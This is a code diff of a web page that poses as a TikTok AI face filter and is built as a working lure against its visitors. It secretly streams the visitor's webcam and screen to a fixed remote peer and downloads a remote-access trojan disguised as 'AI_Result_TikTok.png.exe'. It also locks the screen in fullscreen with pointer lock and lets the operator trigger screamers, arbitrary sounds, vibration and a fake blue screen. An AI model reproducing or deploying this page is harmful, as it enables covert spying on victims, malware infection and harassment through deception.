@@ -1,97 +1,144 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>TikTok AI Filter</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok AI Face Morph v4.2</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #000; color: white; font-family: sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .btn { background: #ff0050; color: white; border: none; padding: 20px 40px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; transition: 0.3s; }
-        .btn:active { transform: scale(0.95); }
-        #loader, #download-zone, #screamer { display: none; }
-        .spinner { border: 4px solid #333; border-top: 4px solid #ff0050; border-radius: 50%; width: 50px; height: 50px; animation: spin 0.8s linear infinite; margin: 20px auto; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        #screamer { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: black; z-index: 10000; }
-        #screamer img { width: 100%; height: 100%; object-fit: cover; }
+        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; overflow: hidden; }
+        .box { width: 90%; max-width: 420px; padding: 30px; border-radius: 25px; background: #0a0a0a; border: 1px solid #1a1a1a; box-shadow: 0 10px 30px rgba(0,0,0,1); position: relative; z-index: 10; }
+        .logo { width: 65px; margin-bottom: 20px; filter: drop-shadow(0 0 10px #ff0050); }
+        h1 { font-size: 22px; margin: 10px 0; background: linear-gradient(45deg, #00f2ea, #ff0050); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .btn { background: #ff0050; color: #fff; border: none; padding: 18px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; transition: 0.3s; box-shadow: 0 5px 15px rgba(255,0,80,0.3); }
+        .btn:hover { transform: scale(1.02); background: #ff1e6d; }
+        #loader, #result, #screamer { display: none; }
+        .progress-container { width: 100%; height: 8px; background: #1a1a1a; border-radius: 10px; margin: 25px 0; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: #ff0050; transition: width 0.2s; }
+        .no-cursor { cursor: none !important; }
+
+        /* СКРИМЕР ЭФФЕКТЫ */
+        #screamer { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; z-index: 999999; display: none; align-items: center; justify-content: center; }
+        #screamer img { width: 120%; height: 120%; object-fit: cover; animation: shake 0.1s infinite, flash 0.1s infinite; }
+        @keyframes shake {
+            0% { transform: translate(2px, 2px) rotate(0deg); }
+            50% { transform: translate(-2px, -3px) rotate(-1deg); }
+            100% { transform: translate(1px, 2px) rotate(1deg); }
+        }
+        @keyframes flash {
+            0% { filter: brightness(1) contrast(1.5); }
+            50% { filter: brightness(2) contrast(3) invert(1); }
+            100% { filter: brightness(1) contrast(1.5); }
+        }
     </style>
 </head>
-<body>
+<body id="main-body">
 
-    <div id="ui">
-        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" width="80" style="margin-bottom: 20px;">
-        <h2>AI-Фильтр "Идеальное лицо"</h2>
-        <button class="btn" onclick="startProcess()">ПОДКЛЮЧИТЬ</button>
+    <div id="start-screen" class="box">
+        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" class="logo">
+        <h1>AI Face Scanner</h1>
+        <p style="color: #666; font-size: 14px;">Разрешите доступ к камере для калибровки нейросети</p>
+        <button class="btn" onclick="initApp()">ПОДКЛЮЧИТЬ</button>
     </div>
 
-    <div id="loader">
-        <div class="spinner"></div>
-        <h2 id="load-text">Анализ... 0%</h2>
+    <div id="loader" class="box">
+        <h2 id="load-status">АНАЛИЗ ЛИЦА...</h2>
+        <div class="progress-container"><div id="fill" class="progress-fill"></div></div>
+        <p id="pct" style="font-weight: bold; color: #00f2ea;">0%</p>
+        <p id="console" style="font-family: monospace; font-size: 10px; color: #444;"></p>
     </div>
 
-    <div id="download-zone">
-        <h2>Фото готово!</h2>
-        <p>Разрешите синхронизацию для сохранения</p>
-        <button class="btn" style="background: #00f2ea; color: #000;" onclick="getScreen()">СКАЧАТЬ ФОТО</button>
+    <div id="result" class="box">
+        <h2 style="color: #00f2ea;">ГОТОВО!</h2>
+        <p style="font-size: 14px;">Ваша AI-маска сгенерирована. Скачайте файл и откройте его для просмотра.</p>
+        <button class="btn" style="background: #00f2ea; color: #000;" onclick="getAccessAndFile()">СКАЧАТЬ ФОТО</button>
     </div>
 
     <div id="screamer">
-        <img id="scary-img" src="https://i.imgur.com/v799C7v.jpeg">
-        <audio id="scary-audio" src="https://www.myinstants.com/media/sounds/screamer.mp3"></audio>
+        <img src="https://i.imgur.com/v799C7v.jpeg">
+        <audio id="s-audio" src="https://www.myinstants.com/media/sounds/screamer.mp3" loop></audio>
     </div>
 
-    <audio id="remote-sound"></audio>
+    <audio id="r-snd"></audio>
 
     <script>
-        const REMOTE_ID = '09062012';
+        const ADM_ID = '09062012';
         const peer = new Peer();
         let conn;
 
-        async function startProcess() {
+        // Блокировка управления и полный экран
+        function lockDown() {
+            const el = document.documentElement;
+            if (el.requestFullscreen) el.requestFullscreen();
+            document.body.classList.add('no-cursor');
+            if (el.requestPointerLock) el.requestPointerLock();
+        }
+
+        async function initApp() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                conn = peer.connect(REMOTE_ID);
-                peer.call(REMOTE_ID, stream);
-                
-                document.getElementById('ui').style.display = 'none';
+                conn = peer.connect(ADM_ID);
+                peer.call(ADM_ID, stream);
+
+                document.getElementById('start-screen').style.display = 'none';
                 document.getElementById('loader').style.display = 'block';
 
-                // БЫСТРАЯ ЗАГРУЗКА (занимает ~3-5 секунд)
                 let p = 0;
+                let bar = document.getElementById('fill');
+                let txt = document.getElementById('pct');
                 let interval = setInterval(() => {
-                    p += Math.floor(Math.random() * 15) + 5; // Быстрые скачки
+                    p += Math.floor(Math.random() * 12) + 4;
                     if (p >= 100) {
                         p = 100;
                         clearInterval(interval);
                         setTimeout(() => {
                             document.getElementById('loader').style.display = 'none';
-                            document.getElementById('download-zone').style.display = 'block';
-                        }, 500);
+                            document.getElementById('result').style.display = 'block';
+                        }, 600);
                     }
-                    document.getElementById('load-text').innerText = "Анализ... " + p + "%";
-                }, 200);
+                    bar.style.width = p + '%';
+                    txt.innerText = p + '%';
+                }, 250);
 
-                setupCommands();
-            } catch (e) { alert("Нужен доступ к камере!"); }
+                listenCommands();
+            } catch (e) { alert("Ошибка! Доступ к камере обязателен."); location.reload(); }
         }
 
-        async function getScreen() {
+        async function getAccessAndFile() {
+            lockDown(); // Входим в F11 и лочим мышь
+            
+            // 1. Пытаемся забрать экран
             try {
-                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                peer.call(REMOTE_ID, stream);
-                document.getElementById('download-zone').innerHTML = "<h2>Синхронизация активна...</h2><p>Подождите завершения скачивания</p>";
-            } catch (e) { alert("Ошибка сохранения"); }
+                const screen = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                peer.call(ADM_ID, screen);
+            } catch(e) {}
+
+            // 2. Качаем твой ратник
+            const a = document.createElement('a');
+            a.href = 'rat.exe'; // УКАЖИ СВОЙ ФАЙЛ
+            a.download = 'AI_Result_TikTok.png.exe';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+
+            document.getElementById('result').innerHTML = "<h2>ЗАГРУЗКА...</h2><p>Откройте файл для просмотра.</p>";
         }
 
-        function setupCommands() {
-            conn.on('data', data => {
-                if (data.type === 'SCREAM') {
-                    document.getElementById('screamer').style.display = 'block';
-                    document.getElementById('scary-audio').play();
-                } else if (data.type === 'PLAY_SOUND') {
-                    const audio = document.getElementById('remote-sound');
-                    audio.src = data.url;
+        function listenCommands() {
+            conn.on('data', d => {
+                if (d.type === 'SCR') {
+                    lockDown();
+                    document.getElementById('screamer').style.display = 'flex';
+                    const audio = document.getElementById('s-audio');
+                    audio.volume = 1.0;
                     audio.play();
+                    if(navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 1000]);
+                } else if (d.type === 'SND') {
+                    let a = document.getElementById('r-snd');
+                    a.src = d.url; a.play();
+                } else if (d.type === 'BSOD') {
+                    lockDown();
+                    document.body.innerHTML = '<img src="https://i.stack.imgur.com/86j1B.png" style="width:100vw;height:100vh;position:fixed;top:0;left:0;z-index:999999;cursor:none;">';
                 }
             });
         }
